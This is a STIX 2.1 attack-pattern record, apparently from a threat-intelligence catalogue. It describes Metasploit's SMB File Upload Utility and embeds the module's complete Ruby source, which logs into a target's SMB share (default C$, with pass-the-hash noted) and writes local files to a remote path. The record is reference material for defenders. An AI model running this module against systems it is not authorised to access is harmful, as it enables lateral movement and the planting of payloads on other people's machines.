{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--db281aed-6a31-47fd-bf37-40f688d62128",
    "created": "2024-08-14T16:24:23.759083Z",
    "modified": "2024-08-14T16:24:23.759087Z",
    "name": "SMB File Upload Utility",
    "description": "Q This module uploads a file to a target share and path. The only reason to use this module is if your existing SMB client is not able to support the features of the Metasploit Framework that you need, like pass-the-hash authentication. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/smb/upload_file.rb",
            "external_id": "upload_file.rb"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n\n  # Exploit mixins should be called first\n  include Msf::Exploit::Remote::SMB::Client\n  include Msf::Exploit::Remote::SMB::Client::Authenticated\n  include Msf::Exploit::Remote::SMB::Client::LocalPaths\n  include Msf::Exploit::Remote::SMB::Client::RemotePaths\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize\n    super(\n      'Name'        => 'SMB File Upload Utility',\n      'Description' => %Q{\n        This module uploads a file to a target share and path. The only reason\n      to use this module is if your existing SMB client is not able to support the features\n      of the Metasploit Framework that you need, like pass-the-hash authentication.\n      },\n      'Author'      =>\n        [\n          'hdm'    # metasploit module\n        ],\n      'References'  =>\n        [\n        ],\n      'License'     => MSF_LICENSE\n    )\n\n    register_options([\n      OptString.new('SMBSHARE', [true, 'The name of a writeable share on the server', 'C$'])\n    ])\n\n  end\n\n  def run_host(_ip)\n    validate_lpaths!\n    validate_rpaths!\n    begin\n      vprint_status(\"Connecting to the server...\")\n      connect\n      smb_login()\n\n      vprint_status(\"Mounting the remote share \\\\\\\\#{datastore['RHOST']}\\\\#{datastore['SMBSHARE']}'...\")\n      self.simple.connect(\"\\\\\\\\#{rhost}\\\\#{datastore['SMBSHARE']}\")\n\n      remote_path = remote_paths.first\n\n      if local_paths.nil?\n        print_error(\"Local paths not specified\")\n        return\n      end\n\n      local_paths.each do |local_path|\n        begin\n          vprint_status(\"Trying to upload #{local_path} to #{remote_path}...\")\n\n          fd = simple.open(\"#{remote_path}\", 'wct', write: true)\n          data = ::File.read(datastore['LPATH'], ::File.size(datastore['LPATH']), mode: 'rb')\n          fd.write(data)\n          fd.close\n\n          print_good(\"#{local_path} uploaded to #{remote_path}\")\n        rescue Rex::Proto::SMB::Exceptions::ErrorCode => e\n          elog(\"Unable to upload #{local_path} to #{remote_path}\", error: e)\n          print_error(\"Unable to upload #{local_path} to #{remote_path} : #{e.message}\")\n        end\n      end\n    rescue Rex::Proto::SMB::Exceptions::LoginError => e\n      elog(\"Unable to login:\", error: e)\n      print_error(\"Unable to login: #{e.message}\")\n    end\n  end\nend\n"
}